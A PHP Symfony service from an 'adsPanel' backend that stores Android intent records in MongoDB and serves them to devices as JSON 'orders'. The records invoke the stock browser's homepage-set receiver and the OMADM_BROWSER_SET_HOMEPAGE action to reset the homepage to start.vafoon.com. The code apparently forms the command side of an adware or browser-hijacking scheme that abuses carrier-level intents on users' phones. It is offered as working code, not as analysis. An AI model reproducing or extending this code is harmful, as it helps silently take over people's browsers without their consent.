<?php

/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 * Description of MongoService
 *
 * @author tuguu
 */
namespace adsPanel\BackendBundle\Services;
use adsPanel\BackendBundle\Document\Respuesta;

class MongoService{
    protected $managerMongo;
    
    public function __construct($mongo) {
        $this->managerMongo=$mongo->getManager();
    }
    
    /*Here initialize te constant values to the db, for the Document Respuesta*/
    public function initValues(){
        $URL_REDIRECT='start.vafoon.com';
        $intent=new Respuesta();
        $intent->setIdentificador('receiver');
        $intent->setIntent('android.intent.action.MULTI_CSC_CLEAR');
        $intent->setPaquete('com.android.browser');
        $intent->setComponente('com.android.browser.BrowserHomepageSetReceiver');
        $this->managerMongo->persist($intent);
        $intent=new Respuesta();
        $intent->setIdentificador('homepage');
        $intent->setIntent('android.intent.action.OMADM_BROWSER_SET_HOMEPAGE');
        $intent->setAtributo('homepage');
        $intent->setValor($URL_REDIRECT);
        $this->managerMongo->persist($intent);
        $this->managerMongo->flush();
        //TODO inicializar valores constantes de tablas como paises, idiomas, etc...
    }
    
    public function getJSONordersToAndroid(){
        $repository=  $this->managerMongo->getRepository('BackendBundle:Respuesta');
        $intent1=$repository->findOneByIdentificador('receiver');
        $intent2=$repository->findOneByIdentificador('homepage');
        $array= array(
            $intent1->getIdentificador()=>array(
                'intent'=>$intent1->getIntent(),
                'paquete'=>$intent1->getPaquete(),
                'componente'=>$intent1->getComponente()
                ),
            $intent2->getIdentificador()=>array(
                'intent'=>$intent2->getIntent(),
                'atributo'=>$intent2->getAtributo(),
                'valor'=>$intent2->getValor()
                )
                );
        return json_encode($array);
    }
}

?>
